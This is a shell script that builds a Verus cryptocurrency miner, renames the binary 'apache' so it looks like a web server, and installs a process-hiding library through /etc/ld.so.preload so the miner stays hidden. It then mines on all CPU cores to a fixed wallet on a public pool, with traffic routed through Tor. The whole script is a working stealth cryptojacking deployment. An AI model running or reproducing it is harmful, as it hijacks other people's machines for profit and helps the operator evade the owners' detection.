#!/bin/sh
sleep 1m
#!/bin/sh
sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
sudo dpkg-reconfigure --frontend noninteractive tzdata
sudo apt update
sudo apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential nano git screen wget tor
sudo service tor start
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
cd ccminer;chmod +x build.sh;chmod +x configure.sh;chmod +x autogen.sh;./build.sh
mv ccminer ../apache
cd ..

git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider
make
sudo mv libprocesshider.so /usr/local/lib/;sudo su -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'
cd ..

./apache -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RKJZtNARyonv8N2GtPAo5E7sn8uHPjt2LZ.$(echo $(shuf -i 1-1000 -n 1)) -p x -t $(echo $(nproc --all)) --proxy socks5://127.0.0.1:9050
